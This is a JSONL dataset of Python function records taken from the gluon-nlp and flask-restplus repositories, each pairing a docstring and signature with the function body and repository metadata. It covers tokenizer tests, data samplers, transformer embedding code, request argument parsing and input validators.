{"docstring": "\"\"\"Test for huggingface BPE tokenizer >=0.8\"\"\"\n", "func_signal": "def test_huggingface_bpe_tokenizer_v08():\n", "code": "with tempfile.TemporaryDirectory() as dir_path:\n    model_path = os.path.join(dir_path, 'hf_bpe_new_0.8.model')\n    download(url=get_repo_url() +\n                 'tokenizer_test_models/hf_bpe_new_0.8/hf_bpe.model',\n             path=model_path,\n             sha1_hash='ecda90979561ca4c5a8d769b5e3c9fa2270d5317')\n    vocab_path = os.path.join(dir_path, 'hf_bpe_new_0.8.vocab')\n    download(url=get_repo_url() +\n                 'tokenizer_test_models/hf_bpe_new_0.8/hf_bpe.vocab',\n             path=vocab_path,\n             sha1_hash='b92dde0b094f405208f3ec94b5eae88430bf4262')\n    tokenizer = HuggingFaceTokenizer(model_path, vocab_path)\n    gt_tokenized = [['H', 'ello</w>', ',</w>', 'y</w>', 'all</w>', '!</w>',\n                     'How</w>', 'are</w>', 'you</w>', '?</w>'],\n                    ['G', 'lu', 'on', 'N', 'L', 'P</w>', 'is</w>', 'great</w>',\n                     '!</w>', '!</w>', '!</w>'],\n                    ['G', 'lu', 'on', 'N', 'L', 'P</w>', '-</w>', 'Amaz', 'on</w>',\n                     '-</w>', 'Ha', 'i', 'bin</w>', '-</w>', 'Leon', 'ard</w>', '-</w>',\n                     'Sh', 'eng</w>', '-</w>', 'S', 'hu', 'ai</w>', '-</w>', 'X', 'ing',\n                     'j', 'ian</w>', '.</w>', '.</w>', '.</w>', '.</w>', '.</w>', '/</w>',\n                     ':</w>', '!</w>', '@</w>', '#</w>', 'ab', 'c</w>']]\n    gt_offsets = [[(0, 1), (1, 5), (5, 6), (7, 8), (9, 12), (12, 13), (14, 17),\n                   (18, 21), (22, 25), (34, 35)],\n                  [(0, 1), (1, 3), (3, 5), (5, 6), (6, 7), (7, 8), (9, 11), (12, 17),\n                   (20, 21), (21, 22), (22, 23)],\n                  [(0, 1), (1, 3), (3, 5), (5, 6), (6, 7), (7, 8), (8, 9), (9, 13), (13, 15),\n                   (15, 16), (16, 18), (18, 19), (19, 22), (22, 23), (23, 27), (27, 30),\n                   (30, 31), (31, 33), (33, 36), (36, 37), (37, 38), (38, 40), (40, 42),\n                   (42, 43), (43, 44), (44, 47), (47, 48), (48, 51), (51, 52), (52, 53),\n                   (53, 54), (54, 55), (55, 56), (56, 57), (57, 58), (58, 59), (59, 60),\n                   (60, 61), (63, 65), (65, 66)]]\n    gt_decode = ['Hello , y all ! How are you ?',\n                 'GluonNLP is great ! ! !',\n                 'GluonNLP - Amazon - Haibin - Leonard - Sheng - Shuai - Xingjian'\n                 ' . . . . . / : ! @ # abc']\n    verify_encode_token(tokenizer, SUBWORD_TEST_SAMPLES, gt_tokenized)\n    verify_pickleble(tokenizer, HuggingFaceTokenizer)\n    verify_encode_token_with_offsets(tokenizer, SUBWORD_TEST_SAMPLES, gt_offsets)\n    verify_decode_hf(tokenizer, SUBWORD_TEST_SAMPLES, gt_decode)", "path": "gluon-nlp/tests/test_data_tokenizers.py", "commit_date": "2020-10-29 00:00:00", "repo_name": "dmlc/gluon-nlp", "stars": 2549, "license": "apache-2.0", "language": "python", "size": 11414}
{"docstring": "\"\"\"Return a string representing the statistics of the bucketing sampler.\n\nReturns\n-------\nret : str\n    String representing the statistics of the buckets.\n\"\"\"\n", "func_signal": "def __repr__(self):\n", "code": "ret = '{name}(\\n' \\\n    '  sample_num={sample_num}, batch_num={batch_num}\\n' \\\n    '  key={bucket_keys}\\n' \\\n    '  cnt={bucket_counts}\\n' \\\n    '  batch_size={bucket_batch_sizes}\\n'\\\n    ')'\\\n    .format(name=self.__class__.__name__,\n            sample_num=len(self._lengths),\n            batch_num=len(self._batch_infos),\n            bucket_keys=self._bucket_keys,\n            bucket_counts=[len(sample_ids) for sample_ids in self._bucket_sample_ids],\n            bucket_batch_sizes=self._bucket_batch_sizes)\nreturn ret", "path": "gluon-nlp/src/gluonnlp/data/sampler.py", "commit_date": "2020-11-06 00:00:00", "repo_name": "dmlc/gluon-nlp", "stars": 2549, "license": "apache-2.0", "language": "python", "size": 11414}
{"docstring": "\"\"\"Make the SentencepieceTokenizer pickleble.\n We will remove the _spt_cls and _sp_model, which are not picklable, and try to\n reconstruct the class via the saved model_path. This behavior is only acceptable for\n multiprocessing and should not be used to save sentencepiece models.\"\"\"\n", "func_signal": "def __getstate__(self):\n", "code": "state = self.__dict__.copy()\nstate['_spt_cls'] = None\nstate['_sp_model'] = None\nreturn state", "path": "gluon-nlp/src/gluonnlp/data/tokenizers/sentencepiece.py", "commit_date": "2020-09-03 00:00:00", "repo_name": "dmlc/gluon-nlp", "stars": 2549, "license": "apache-2.0", "language": "python", "size": 11414}
{"docstring": "# Extract examples between `start` and `end`, shuffle and return them.\n", "func_signal": "def __iter__(self):\n", "code": "file_iter = []\nfor _ in range(self._repeat):\n    indices = list(range(self._start, self._end))\n    if self.even_size and len(indices) < self._len:\n        # guaranteed to have part_len number of samples\n        candidates = list(range(self._total_length))\n        extras = random.sample(candidates, k=self._len-len(indices))\n        indices.extend(extras)\n    if self._shuffle:\n        random.shuffle(indices)\n    file_iter.extend(indices)\nreturn iter(file_iter)", "path": "gluon-nlp/src/gluonnlp/data/sampler.py", "commit_date": "2020-11-06 00:00:00", "repo_name": "dmlc/gluon-nlp", "stars": 2549, "license": "apache-2.0", "language": "python", "size": 11414}
{"docstring": "\"\"\"Test for huggingface bytebpe tokenizer >=0.8\"\"\"\n", "func_signal": "def test_huggingface_bytebpe_tokenizer_v08():\n", "code": "with tempfile.TemporaryDirectory() as dir_path:\n    model_path = os.path.join(dir_path, 'hf_bytebpe_new_0.8.model')\n    download(url=get_repo_url() +\n                 'tokenizer_test_models/hf_bytebpe_new_0.8/hf_bytebpe.model',\n             path=model_path,\n             sha1_hash='a1c4da1f6c21df923e150f56dbb5b7a53c61808b')\n    vocab_path = os.path.join(dir_path, 'hf_bytebpe_new_0.8.vocab')\n    download(url=get_repo_url() +\n                 'tokenizer_test_models/hf_bytebpe_new_0.8/hf_bytebpe.vocab',\n             path=vocab_path,\n             sha1_hash='7831b19078a3222f450e65b2188dc0770473123b')\n    tokenizer = HuggingFaceTokenizer(model_path, vocab_path)\n    gt_tokenized = [['He', 'llo', ',', '\u0120y', \"'\", 'all', '!', '\u0120How', '\u0120are', '\u0120you',\n                     '\u0120\u00e2', '\u0127', '\u00a7', '\u0120', '\u00f0', '\u0141', '\u013a', '\u0123', '\u0120', '\u00f0', '\u0141', '\u013a',\n                     '\u0123', '\u0120', '\u00f0', '\u0141', '\u013a', '\u0123', '\u0120?'],\n                    ['G', 'l', 'u', 'on', 'N', 'L', 'P', '\u0120is', '\u0120great', '\u00ef', '\u00bc', '\u0123',\n                     '\u00ef', '\u00bc', '\u0123', '\u00ef', '\u00bc', '\u0123', '!', '!', '!'],\n                    ['G', 'l', 'u', 'on', 'N', 'L', 'P', '-', 'Am', 'az', 'on', '-',\n                     'Ha', 'ib', 'in', '-', 'Le', 'on', 'ard', '-', 'S', 'hen', 'g', '-',\n                     'Sh', 'u', 'ai', '-', 'X', 'ing', 'j', 'ian',\n                     '..', '...', '/', ':', '!', '@', '#', '\u0120', \"'\", 'ab', 'c', \"'\"]]\n    gt_offsets = [[(0, 2), (2, 5), (5, 6), (6, 8), (8, 9), (9, 12), (12, 13), (13, 17),\n                   (17, 21), (21, 25), (25, 27), (26, 27), (26, 27), (27, 28), (28, 29),\n                   (28, 29), (28, 29), (28, 29), (29, 30), (30, 31), (30, 31), (30, 31),\n                   (30, 31), (31, 32), (32, 33), (32, 33), (32, 33), (32, 33), (33, 35)],\n                  [(0, 1), (1, 2), (2, 3), (3, 5), (5, 6), (6, 7), (7, 8), (8, 11), (11, 17),\n                   (17, 18), (17, 18), (17, 18), (18, 19), (18, 19), (18, 19), (19, 20),\n                   (19, 20), (19, 20), (20, 21), (21, 22), (22, 23)],\n                  [(0, 1), (1, 2), (2, 3), (3, 5), (5, 6), (6, 7), (7, 8), (8, 9), (9, 11),\n                   (11, 13), (13, 15), (15, 16), (16, 18), (18, 20), (20, 22), (22, 23),\n                   (23, 25), (25, 27), (27, 30), (30, 31), (31, 32), (32, 35), (35, 36),\n                   (36, 37), (37, 39), (39, 40), (40, 42), (42, 43), (43, 44),\n                   (44, 47), (47, 48), (48, 51), (51, 53), (53, 56), (56, 57),\n                   (57, 58), (58, 59), (59, 60), (60, 61), (61, 62), (62, 63),\n                   (63, 65), (65, 66), (66, 67)]]\n    gt_decode = [\"Hello, y'all! How are you \u2167 \ud83d\ude01 \ud83d\ude01 \ud83d\ude01 ?\",\n                 'GluonNLP is great\uff01\uff01\uff01!!!',\n                 \"GluonNLP-Amazon-Haibin-Leonard-Sheng-Shuai-Xingjian...../:!@# 'abc'\"]\n    verify_encode_token(tokenizer, SUBWORD_TEST_SAMPLES, gt_tokenized)\n    verify_pickleble(tokenizer, HuggingFaceTokenizer)\n    verify_encode_token_with_offsets(tokenizer, SUBWORD_TEST_SAMPLES, gt_offsets)\n    verify_decode_hf(tokenizer, SUBWORD_TEST_SAMPLES, gt_decode)", "path": "gluon-nlp/tests/test_data_tokenizers.py", "commit_date": "2020-10-29 00:00:00", "repo_name": "dmlc/gluon-nlp", "stars": 2549, "license": "apache-2.0", "language": "python", "size": 11414}
{"docstring": "# When the vocab is not attached, should raise ValueError\n", "func_signal": "def verify_decode_no_vocab_raise(tokenizer):\n", "code": "for sentences in [EN_SAMPLES[0], EN_SAMPLES]:\n    with pytest.raises(ValueError):\n        tokenizer.encode(sentences, int)\nwith pytest.raises(ValueError):\n    tokenizer.decode([0])\nwith pytest.raises(ValueError):\n    tokenizer.decode([[0], [1]])", "path": "gluon-nlp/tests/test_data_tokenizers.py", "commit_date": "2020-10-29 00:00:00", "repo_name": "dmlc/gluon-nlp", "stars": 2549, "license": "apache-2.0", "language": "python", "size": 11414}
{"docstring": "\"\"\"Whether the sub-token is the last sub-token in a split token list.\n\nOnly supports the case when the tokenizer is a HuggingFaceBPETokenizer\n\nParameters\n----------\ntokens\n    A single token or a list of tokens\n\nReturns\n-------\nret\n    The results\n\"\"\"\n", "func_signal": "def is_last_subword(self, tokens):\n", "code": "assert self.model_type == 'BPEDecoder',\\\n    'Only supports BPE model. The model_type={}'.format(self.model_type)\nif isinstance(tokens, str):\n    return tokens.endswith('</w>')\nelif isinstance(tokens, int):\n    return tokens in self._last_subtoken_id_set\nelif isinstance(tokens, list):\n    if len(tokens) == 0:\n        return []\n    if isinstance(tokens[0], str):\n        return [ele.endswith('</w>') for ele in tokens], False\n    elif isinstance(tokens[0], int):\n        return [ele in self._last_subtoken_id_set for ele in tokens], False\n    else:\n        raise NotImplementedError\nelse:\n    raise NotImplementedError", "path": "gluon-nlp/src/gluonnlp/data/tokenizers/huggingface.py", "commit_date": "2020-12-01 00:00:00", "repo_name": "dmlc/gluon-nlp", "stars": 2549, "license": "apache-2.0", "language": "python", "size": 11414}
{"docstring": "\"\"\"Getting the scores of the masked positions.\n\nParameters\n----------\nF\ninputs\n    - layout = 'NT'\n        Shape (batch_size, seq_length)\n    - layout = 'TN'\n        Shape (seq_length, batch_size)\nvalid_length\n    The valid length of each sequence\n    Shape (batch_size,)\nmasked_positions\n    The masked position of the sequence\n    Shape (batch_size, num_masked_positions).\n\nReturns\n-------\ncontextual_embedding\n    - layout = 'NT'\n        Shape (batch_size, seq_length, units).\n    - layout = 'TN'\n        Shape (seq_length, batch_size, units).\npooled_out\n    Shape (batch_size, units)\nmlm_scores :\n    Shape (batch_size, num_masked_positions, vocab_size)\n\"\"\"\n\n", "func_signal": "def forward(self, inputs, valid_length, masked_positions):\n", "code": "all_encodings_outputs, pooled_out = self.backbone_model(inputs, valid_length)\nif self.backbone_model._output_all_encodings:\n    contextual_embeddings = all_encodings_outputs[-1]\nelse:\n    contextual_embeddings = all_encodings_outputs\nif self.backbone_model.layout == 'TN':\n    contextual_embeddings = np.swapaxes(contextual_embeddings, 0, 1)\nmlm_features = select_vectors_by_position(contextual_embeddings, masked_positions)\nmlm_scores = self.mlm_decoder(mlm_features)\nreturn all_encodings_outputs, pooled_out, mlm_scores", "path": "gluon-nlp/src/gluonnlp/models/roberta.py", "commit_date": "2020-11-05 00:00:00", "repo_name": "dmlc/gluon-nlp", "stars": 2549, "license": "apache-2.0", "language": "python", "size": 11414}
{"docstring": "\"\"\"Generate the representation given the inputs.\n\nThis is used for pre-training or fine-tuning a mobile bert model.\nGet the first token of the whole sequence which is [CLS]\n\nParameters\n----------\nsequence\n    - layout = 'NT'\n        Shape (batch_size, sequence_length, units)\n    - layout = 'TN'\n        Shape (sequence_length, batch_size, units)\n\nReturns\n-------\noutputs\n    Shape (batch_size, units)\n\"\"\"\n", "func_signal": "def apply_pooling(self, sequence):\n", "code": "if self._layout == 'NT':\n    outputs = sequence[:, 0, :]\nelse:\n    outputs = sequence[0, :, :]\nif self.classifier_activation:\n    return self.pooler(outputs)\nelse:\n    return outputs", "path": "gluon-nlp/src/gluonnlp/models/mobilebert.py", "commit_date": "2020-11-05 00:00:00", "repo_name": "dmlc/gluon-nlp", "stars": 2549, "license": "apache-2.0", "language": "python", "size": 11414}
{"docstring": "\"\"\"\nRegister the given object under either the nickname or `obj.__name__`. It can be used as\n either a decorator or not. See docstring of this class for usage.\n\"\"\"\n", "func_signal": "def register(self, *args):\n", "code": "if len(args) == 2:\n    # Register an object with nick name by function call\n    nickname, obj = args\n    self._do_register(nickname, obj)\nelif len(args) == 1:\n    if isinstance(args[0], str):\n        # Register an object with nick name by decorator\n        nickname = args[0]\n        def deco(func_or_class: object) -> object:\n            self._do_register(nickname, func_or_class)\n            return func_or_class\n        return deco\n    else:\n        # Register an object by function call\n        self._do_register(args[0].__name__, args[0])\nelif len(args) == 0:\n    # Register an object by decorator\n    def deco(func_or_class: object) -> object:\n        self._do_register(func_or_class.__name__, func_or_class)\n        return func_or_class\n    return deco\nelse:\n    raise ValueError('Do not support the usage!')", "path": "gluon-nlp/src/gluonnlp/utils/registry.py", "commit_date": "2020-09-03 00:00:00", "repo_name": "dmlc/gluon-nlp", "stars": 2549, "license": "apache-2.0", "language": "python", "size": 11414}
{"docstring": "\"\"\"Get the initial token embeddings that considers the token type and positional embeddings\n\nParameters\n----------\nF\ninputs\n    - layout = 'NT'\n        Shape (batch_size, seq_length)\n    - layout = 'TN'\n        Shape (seq_length, batch_size)\ntoken_types\n    - layout = 'NT'\n        Shape (batch_size, seq_length)\n    - layout = 'TN'\n        Shape (seq_length, batch_size)\n    If None, it will be initialized as all zero\n\nReturns\n-------\nembedding\n    The initial embedding that will be fed into the encoder\n\"\"\"\n", "func_signal": "def get_initial_embedding(self, inputs, token_types=None):\n", "code": "if self._layout == 'NT':\n    batch_axis, time_axis = 0, 1\nelif self._layout == 'TN':\n    batch_axis, time_axis = 1, 0\nelse:\n    raise NotImplementedError\nword_embedding = self.word_embed(inputs)\n\nif self.trigram_embed:\n    if self._layout == 'NT':\n        word_embedding = np.concatenate(\n            [np.pad(word_embedding[:, 1:], ((0, 0), (0, 1), (0, 0))),\n             word_embedding,\n             np.pad(word_embedding[:, :-1], ((0, 0), (1, 0), (0, 0)))], axis=-1)\n    elif self._layout == 'TN':\n        word_embedding = np.concatenate(\n            [np.pad(word_embedding[1:, :], ((0, 1), (0, 0), (0, 0))),\n             word_embedding,\n             np.pad(word_embedding[:-1, :], ((1, 0), (0, 0), (0, 0)))], axis=-1)\n    else:\n        raise NotImplementedError\n# Projecting the embedding into units only for word embedding\nif self.trigram_embed or self.embed_size != self.units:\n    word_embedding = self.embed_factorized_proj(word_embedding)\n\nif token_types is None:\n    token_types = np.zeros_like(inputs)\ntype_embedding = self.token_type_embed(token_types)\nembedding = word_embedding + type_embedding\nif self.pos_embed_type is not None:\n    positional_embedding =\\\n        self.token_pos_embed(npx.arange_like(embedding, axis=time_axis))\n    positional_embedding = np.expand_dims(positional_embedding, axis=batch_axis)\n    embedding = embedding + positional_embedding\n# Extra layer normalization plus dropout\nembedding = self.embed_layer_norm(embedding)\nembedding = self.embed_dropout(embedding)\nreturn embedding", "path": "gluon-nlp/src/gluonnlp/models/mobilebert.py", "commit_date": "2020-11-05 00:00:00", "repo_name": "dmlc/gluon-nlp", "stars": 2549, "license": "apache-2.0", "language": "python", "size": 11414}
{"docstring": "\"\"\"Get the initial token embeddings that considers the token type and positional embeddings\n\nParameters\n----------\nF\ninputs\n    - layout = 'NT'\n        Shape (batch_size, seq_length)\n    - layout = 'TN'\n        Shape (seq_length, batch_size)\n\nReturns\n-------\nembedding\n    The initial embedding that will be fed into the encoder\n    - layout = 'NT'\n        Shape (batch_size, seq_length, C)\n    - layout = 'TN'\n        Shape (seq_length, batch_size, C)\n\"\"\"\n", "func_signal": "def get_initial_embedding(self, inputs):\n", "code": "if self._layout == 'NT':\n    batch_axis, time_axis = 0, 1\nelse:\n    batch_axis, time_axis = 1, 0\nembedding = self.word_embed(inputs)\nif self.pos_embed_type:\n    positional_embedding = self.pos_embed(npx.arange_like(inputs, axis=time_axis))\n    positional_embedding = np.expand_dims(positional_embedding, axis=batch_axis)\n    embedding = embedding + positional_embedding\nif self.encoder_normalize_before:\n    embedding = self.embed_ln(embedding)\nembedding = self.embed_dropout(embedding)\n\nreturn embedding", "path": "gluon-nlp/src/gluonnlp/models/roberta.py", "commit_date": "2020-11-05 00:00:00", "repo_name": "dmlc/gluon-nlp", "stars": 2549, "license": "apache-2.0", "language": "python", "size": 11414}
{"docstring": "\"\"\"Set the subword-regularization parameters\n\nFor more details, you may refer to the official SentencePiece library:\n\nhttps://github.com/google/sentencepiece\n\nParameters\n----------\nnbest\nalpha\n\nReturns\n-------\n\n\"\"\"\n", "func_signal": "def set_subword_regularization(self, nbest, alpha):\n", "code": "self._nbest = nbest\nself._alpha = alpha", "path": "gluon-nlp/src/gluonnlp/data/tokenizers/sentencepiece.py", "commit_date": "2020-09-03 00:00:00", "repo_name": "dmlc/gluon-nlp", "stars": 2549, "license": "apache-2.0", "language": "python", "size": 11414}
{"docstring": "'''\nParse all arguments from the provided request and return the results as a ParseResult\n\n:param bool strict: if req includes args not in parser, throw 400 BadRequest exception\n:return: the parsed results as :class:`ParseResult` (or any class defined as :attr:`result_class`)\n:rtype: ParseResult\n'''\n", "func_signal": "def parse_args(self, req=None, strict=False):\n", "code": "if req is None:\n    req = request\n\nresult = self.result_class()\n\n# A record of arguments not yet parsed; as each is found\n# among self.args, it will be popped out\nreq.unparsed_arguments = dict(self.argument_class('').source(req)) if strict else {}\nerrors = {}\nfor arg in self.args:\n    value, found = arg.parse(req, self.bundle_errors)\n    if isinstance(value, ValueError):\n        errors.update(found)\n        found = None\n    if found or arg.store_missing:\n        result[arg.dest or arg.name] = value\nif errors:\n    abort(HTTPStatus.BAD_REQUEST, 'Input payload validation failed', errors=errors)\n\nif strict and req.unparsed_arguments:\n    arguments = ', '.join(req.unparsed_arguments.keys())\n    msg = 'Unknown arguments: {0}'.format(arguments)\n    raise exceptions.BadRequest(msg)\n\nreturn result", "path": "flask-restplus/flask_restplus/reqparse.py", "commit_date": "2019-01-28 00:00:00", "repo_name": "noirbizarre/flask-restplus", "stars": 2728, "license": "other", "language": "python", "size": 1316}
{"docstring": "'''Restrict input type to the natural numbers (0, 1, 2, 3...)'''\n", "func_signal": "def natural(value, argument='argument'):\n", "code": "value = _get_integer(value)\nif value < 0:\n    msg = 'Invalid {arg}: {value}. {arg} must be a non-negative integer'\n    raise ValueError(msg.format(arg=argument, value=value))\nreturn value", "path": "flask-restplus/flask_restplus/inputs.py", "commit_date": "2019-06-23 00:00:00", "repo_name": "noirbizarre/flask-restplus", "stars": 2728, "license": "other", "language": "python", "size": 1316}
{"docstring": "'''Creates a copy of this RequestParser with the same set of arguments'''\n", "func_signal": "def copy(self):\n", "code": "parser_copy = self.__class__(self.argument_class, self.result_class)\nparser_copy.args = deepcopy(self.args)\nparser_copy.trim = self.trim\nparser_copy.bundle_errors = self.bundle_errors\nreturn parser_copy", "path": "flask-restplus/flask_restplus/reqparse.py", "commit_date": "2019-01-28 00:00:00", "repo_name": "noirbizarre/flask-restplus", "stars": 2728, "license": "other", "language": "python", "size": 1316}
{"docstring": "'''Remove the argument matching the given name.'''\n", "func_signal": "def remove_argument(self, name):\n", "code": "for index, arg in enumerate(self.args[:]):\n    if name == arg.name:\n        del self.args[index]\n        break\nreturn self", "path": "flask-restplus/flask_restplus/reqparse.py", "commit_date": "2019-01-28 00:00:00", "repo_name": "noirbizarre/flask-restplus", "stars": 2728, "license": "other", "language": "python", "size": 1316}
{"docstring": "'''\nParse the string ``\"true\"`` or ``\"false\"`` as a boolean (case insensitive).\n\nAlso accepts ``\"1\"`` and ``\"0\"`` as ``True``/``False`` (respectively).\n\nIf the input is from the request JSON body, the type is already a native python boolean,\nand will be passed through without further parsing.\n\n:raises ValueError: if the boolean value is invalid\n'''\n", "func_signal": "def boolean(value):\n", "code": "if isinstance(value, bool):\n    return value\n\nif value is None:\n    raise ValueError('boolean type must be non-null')\nelif not value:\n    return False\nvalue = str(value).lower()\nif value in ('true', '1', 'on',):\n    return True\nif value in ('false', '0',):\n    return False\nraise ValueError('Invalid literal for boolean(): {0}'.format(value))", "path": "flask-restplus/flask_restplus/inputs.py", "commit_date": "2019-06-23 00:00:00", "repo_name": "noirbizarre/flask-restplus", "stars": 2728, "license": "other", "language": "python", "size": 1316}
{"docstring": "'''\nRecursively merges two dictionaries.\n\nSecond dictionary values will take precedence over those from the first one.\nNested dictionaries are merged too.\n\n:param dict first: The first dictionary\n:param dict second: The second dictionary\n:return: the resulting merged dictionary\n:rtype: dict\n'''\n", "func_signal": "def merge(first, second):\n", "code": "if not isinstance(second, dict):\n    return second\nresult = deepcopy(first)\nfor key, value in iteritems(second):\n    if key in result and isinstance(result[key], dict):\n        result[key] = merge(result[key], value)\n    else:\n        result[key] = deepcopy(value)\nreturn result", "path": "flask-restplus/flask_restplus/utils.py", "commit_date": "2019-10-14 00:00:00", "repo_name": "noirbizarre/flask-restplus", "stars": 2728, "license": "other", "language": "python", "size": 1316}
{"docstring": "'''\nParses ISO 8601-formatted datetime intervals into tuples of datetimes.\n\nAccepts both a single date(time) or a full interval using either start/end\nor start/duration notation, with the following behavior:\n\n- Intervals are defined as inclusive start, exclusive end\n- Single datetimes are translated into the interval spanning the\n  largest resolution not specified in the input value, up to the day.\n- The smallest accepted resolution is 1 second.\n- All timezones are accepted as values; returned datetimes are\n  localized to UTC. Naive inputs and date inputs will are assumed UTC.\n\nExamples::\n\n    \"2013-01-01\" -> datetime(2013, 1, 1), datetime(2013, 1, 2)\n    \"2013-01-01T12\" -> datetime(2013, 1, 1, 12), datetime(2013, 1, 1, 13)\n    \"2013-01-01/2013-02-28\" -> datetime(2013, 1, 1), datetime(2013, 2, 28)\n    \"2013-01-01/P3D\" -> datetime(2013, 1, 1), datetime(2013, 1, 4)\n    \"2013-01-01T12:00/PT30M\" -> datetime(2013, 1, 1, 12), datetime(2013, 1, 1, 12, 30)\n    \"2013-01-01T06:00/2013-01-01T12:00\" -> datetime(2013, 1, 1, 6), datetime(2013, 1, 1, 12)\n\n:param str value: The ISO8601 date time as a string\n:return: Two UTC datetimes, the start and the end of the specified interval\n:rtype: A tuple (datetime, datetime)\n:raises ValueError: if the interval is invalid.\n'''\n", "func_signal": "def iso8601interval(value, argument='argument'):\n", "code": "if not value:\n    raise ValueError('Expected a valid ISO8601 date/time interval.')\n\ntry:\n    start, end = _parse_interval(value)\n\n    if end is None:\n        end = _expand_datetime(start, value)\n\n    start, end = _normalize_interval(start, end, value)\n\nexcept ValueError:\n    msg = 'Invalid {arg}: {value}. {arg} must be a valid ISO8601 date/time interval.'\n    raise ValueError(msg.format(arg=argument, value=value))\n\nreturn start, end", "path": "flask-restplus/flask_restplus/inputs.py", "commit_date": "2019-06-23 00:00:00", "repo_name": "noirbizarre/flask-restplus", "stars": 2728, "license": "other", "language": "python", "size": 1316}
{"docstring": "'''\nAdds an argument to be parsed.\n\nAccepts either a single instance of Argument or arguments to be passed\ninto :class:`Argument`'s constructor.\n\nSee :class:`Argument`'s constructor for documentation on the available options.\n'''\n\n", "func_signal": "def add_argument(self, *args, **kwargs):\n", "code": "if len(args) == 1 and isinstance(args[0], self.argument_class):\n    self.args.append(args[0])\nelse:\n    self.args.append(self.argument_class(*args, **kwargs))\n\n# Do not know what other argument classes are out there\nif self.trim and self.argument_class is Argument:\n    # enable trim for appended element\n    self.args[-1].trim = kwargs.get('trim', self.trim)\n\nreturn self", "path": "flask-restplus/flask_restplus/reqparse.py", "commit_date": "2019-01-28 00:00:00", "repo_name": "noirbizarre/flask-restplus", "stars": 2728, "license": "other", "language": "python", "size": 1316}
{"docstring": "'''\nCalled when an error is raised while parsing. Aborts the request\nwith a 400 status and an error message\n\n:param error: the error that was raised\n:param bool bundle_errors: do not abort when first error occurs, return a\n    dict with the name of the argument and the error message to be\n    bundled\n'''\n", "func_signal": "def handle_validation_error(self, error, bundle_errors):\n", "code": "error_str = six.text_type(error)\nerror_msg = ' '.join([six.text_type(self.help), error_str]) if self.help else error_str\nerrors = {self.name: error_msg}\n\nif bundle_errors:\n    return ValueError(error), errors\nabort(HTTPStatus.BAD_REQUEST, 'Input payload validation failed', errors=errors)", "path": "flask-restplus/flask_restplus/reqparse.py", "commit_date": "2019-01-28 00:00:00", "repo_name": "noirbizarre/flask-restplus", "stars": 2728, "license": "other", "language": "python", "size": 1316}
{"docstring": "'''\nDo some nasty try/except voodoo to get some sort of datetime\nobject(s) out of the string.\n'''\n", "func_signal": "def _parse_interval(value):\n", "code": "try:\n    return sorted(aniso8601.parse_interval(value))\nexcept ValueError:\n    try:\n        return aniso8601.parse_datetime(value), None\n    except ValueError:\n        return aniso8601.parse_date(value), None", "path": "flask-restplus/flask_restplus/inputs.py", "commit_date": "2019-06-23 00:00:00", "repo_name": "noirbizarre/flask-restplus", "stars": 2728, "license": "other", "language": "python", "size": 1316}
{"docstring": "'''\nTransform a CamelCase string into a low_dashed one\n\n:param str value: a CamelCase string to transform\n:return: the low_dashed string\n:rtype: str\n'''\n", "func_signal": "def camel_to_dash(value):\n", "code": "first_cap = FIRST_CAP_RE.sub(r'\\1_\\2', value)\nreturn ALL_CAP_RE.sub(r'\\1_\\2', first_cap).lower()", "path": "flask-restplus/flask_restplus/utils.py", "commit_date": "2019-10-14 00:00:00", "repo_name": "noirbizarre/flask-restplus", "stars": 2728, "license": "other", "language": "python", "size": 1316}
{"docstring": "'''Validate an IPv4 address'''\n", "func_signal": "def ipv4(value):\n", "code": "try:\n    socket.inet_aton(value)\n    if value.count('.') == 3:\n        return value\nexcept socket.error:\n    pass\nraise ValueError('{0} is not a valid ipv4 address'.format(value))", "path": "flask-restplus/flask_restplus/inputs.py", "commit_date": "2019-06-23 00:00:00", "repo_name": "noirbizarre/flask-restplus", "stars": 2728, "license": "other", "language": "python", "size": 1316}
{"docstring": "'''Restrict input type to the positive integers (1, 2, 3...)'''\n", "func_signal": "def positive(value, argument='argument'):\n", "code": "value = _get_integer(value)\nif value < 1:\n    msg = 'Invalid {arg}: {value}. {arg} must be a positive integer'\n    raise ValueError(msg.format(arg=argument, value=value))\nreturn value", "path": "flask-restplus/flask_restplus/inputs.py", "commit_date": "2019-06-23 00:00:00", "repo_name": "noirbizarre/flask-restplus", "stars": 2728, "license": "other", "language": "python", "size": 1316}
{"docstring": "# Don't cast None\n", "func_signal": "def convert(self, value, op):\n", "code": "if value is None:\n    if not self.nullable:\n        raise ValueError('Must not be null!')\n    return None\n\nelif isinstance(self.type, Model) and isinstance(value, dict):\n    return marshal(value, self.type)\n\n# and check if we're expecting a filestorage and haven't overridden `type`\n# (required because the below instantiation isn't valid for FileStorage)\nelif isinstance(value, FileStorage) and self.type == FileStorage:\n    return value\n\ntry:\n    return self.type(value, self.name, op)\nexcept TypeError:\n    try:\n        if self.type is decimal.Decimal:\n            return self.type(str(value), self.name)\n        else:\n            return self.type(value, self.name)\n    except TypeError:\n        return self.type(value)", "path": "flask-restplus/flask_restplus/reqparse.py", "commit_date": "2019-01-28 00:00:00", "repo_name": "noirbizarre/flask-restplus", "stars": 2728, "license": "other", "language": "python", "size": 1316}
{"docstring": "'''\nUnpack a Flask standard response.\n\nFlask response can be:\n- a single value\n- a 2-tuple ``(value, code)``\n- a 3-tuple ``(value, code, headers)``\n\n.. warning::\n\n    When using this function, you must ensure that the tuple is not the response data.\n    To do so, prefer returning list instead of tuple for listings.\n\n:param response: A Flask style response\n:param int default_code: The HTTP code to use as default if none is provided\n:return: a 3-tuple ``(data, code, headers)``\n:rtype: tuple\n:raise ValueError: if the response does not have one of the expected format\n'''\n", "func_signal": "def unpack(response, default_code=HTTPStatus.OK):\n", "code": "if not isinstance(response, tuple):\n    # data only\n    return response, default_code, {}\nelif len(response) == 1:\n    # data only as tuple\n    return response[0], default_code, {}\nelif len(response) == 2:\n    # data and code\n    data, code = response\n    return data, code, {}\nelif len(response) == 3:\n    # data, code and headers\n    data, code, headers = response\n    return data, code or default_code, headers\nelse:\n    raise ValueError('Too many response values')", "path": "flask-restplus/flask_restplus/utils.py", "commit_date": "2019-10-14 00:00:00", "repo_name": "noirbizarre/flask-restplus", "stars": 2728, "license": "other", "language": "python", "size": 1316}
{"docstring": "'''Parse a valid looking date in the format YYYY-mm-dd'''\n", "func_signal": "def date(value):\n", "code": "date = datetime.strptime(value, \"%Y-%m-%d\")\nreturn date", "path": "flask-restplus/flask_restplus/inputs.py", "commit_date": "2019-06-23 00:00:00", "repo_name": "noirbizarre/flask-restplus", "stars": 2728, "license": "other", "language": "python", "size": 1316}
